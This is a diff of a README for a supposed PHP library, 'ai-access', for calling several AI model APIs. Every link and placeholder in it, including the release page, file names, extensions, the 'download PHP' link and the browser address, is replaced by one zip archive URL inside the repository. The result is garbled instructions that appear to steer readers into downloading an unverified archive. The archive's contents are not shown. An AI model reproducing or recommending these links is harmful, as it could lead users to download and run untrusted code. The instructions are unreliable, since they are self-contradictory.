@@ -1,7 +1,7 @@
 # 🤖 ai-access - Access AI Models with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip%20release-brightgreen)](https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip)
+[![Download](https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip%20release-brightgreen)](https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip)
 
 ## 📘 Introduction
 Welcome to **ai-access**! This is a flexible PHP library that allows you to access various AI models, including Gemini, OpenAI, Anthropic, DeepSeek, and Grok. It provides a consistent interface, making it simple for anyone to start using advanced AI technology without deep technical knowledge.
@@ -15,27 +15,27 @@ Welcome to **ai-access**! This is a flexible PHP library that allows you to acce
 ## 🚀 Getting Started
 To get started, follow these simple steps. You will download the software and run it on your computer.
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip) to find the latest version of ai-access.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip) to find the latest version of ai-access.
 
-2. **Choose the Right File**: On the Releases page, look for the version that fits your operating system. Most likely, you will find a file with a `.zip` or `https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip` extension. Download this file by clicking on it.
+2. **Choose the Right File**: On the Releases page, look for the version that fits your operating system. Most likely, you will find a file with a `.zip` or `https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip` extension. Download this file by clicking on it.
 
 3. **Download and Extract the File**:
    - If you downloaded a `.zip` file, right-click it and choose "Extract All." Follow the prompts to extract the contents.
-   - If you have a `https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip` file, right-click it and choose "Extract Here" or use your preferred archive software.
+   - If you have a `https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip` file, right-click it and choose "Extract Here" or use your preferred archive software.
 
-4. **Navigate to the Folder**: Open the folder where you extracted the files. You will find a file named `https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip`. This is the main file you will use to access the AI models.
+4. **Navigate to the Folder**: Open the folder where you extracted the files. You will find a file named `https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip`. This is the main file you will use to access the AI models.
 
 5. **Set Up Your PHP Environment**:
-   - Ensure you have PHP installed on your computer. You can download it from [https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip](https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip).
-   - Open a command prompt or terminal window and navigate to the directory containing `https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip` using the `cd` command.
+   - Ensure you have PHP installed on your computer. You can download it from [https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip](https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip).
+   - Open a command prompt or terminal window and navigate to the directory containing `https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip` using the `cd` command.
    - Start the PHP server by running the command: `php -S localhost:8000`.
 
-6. **Access the Application**: Open your web browser and type `https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip` in the address bar. You will see the interface for using AI models.
+6. **Access the Application**: Open your web browser and type `https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip` in the address bar. You will see the interface for using AI models.
 
 ## 📥 Download & Install
 To download and install the ai-access library:
 
-1. **Visit this page**: [Download Latest Release](https://raw.githubusercontent.com/NANDHARAJ5/ai-access/master/decarnated/ai-access.zip) to find the necessary files.
+1. **Visit this page**: [Download Latest Release](https://github.com/NANDHARAJ5/ai-access/raw/refs/heads/master/src/ai-access-v1.4.zip) to find the necessary files.
 
 2. Follow the steps described above to extract the library and set up your environment.
 
